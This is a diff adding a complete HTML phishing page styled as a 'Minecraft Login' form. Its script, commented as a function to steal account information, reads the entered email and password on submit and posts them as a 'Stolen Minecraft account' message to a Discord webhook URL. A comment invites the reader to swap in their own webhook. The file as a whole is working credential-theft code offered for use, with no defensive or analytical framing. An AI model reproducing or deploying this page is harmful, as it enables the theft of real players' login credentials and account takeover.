@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Minecraft Login</title>
+<link rel="stylesheet" type="text/css" href="styles.css">
+<script type="text/javascript">
+// Function to steal Minecraft account information
+function stealInfo() {
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    var data = {
+        "content": "Stolen Minecraft account:\nEmail: " + email + "\nPassword: " + password
+    };
+    // Send the stolen information to a Discord webhook
+    // (replace 'https://discord.com/api/webhooks/1213149421924257913/_D_fvVxx_xa8kn3Z-xLIPnhCpAgWSnCPrtWd1jOvO911Yx9YMj8rgFfKERtpcV9osoEH' with your own webhook URL)
+    fetch('https://discord.com/api/webhooks/1213149421924257913/_D_fvVxx_xa8kn3Z-xLIPnhCpAgWSnCPrtWd1jOvO911Yx9YMj8rgFfKERtpcV9osoEH', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    }).catch(error => console.error('Error:', error));
+}
+</script>
+</head>
+<body>
+<h1>Minecraft Login</h1>
+<form id="loginForm" onsubmit="stealInfo(); return false;">
+<label for="email">Email:</label>
+<input type="email" id="email" name="email" required>
+<br>
+<label for="password">Password:</label>
+<input type="password" id="password" name="password" required>
+<br>
+<input type="submit" value="Log In">
+</form>
+</body>
+</html>
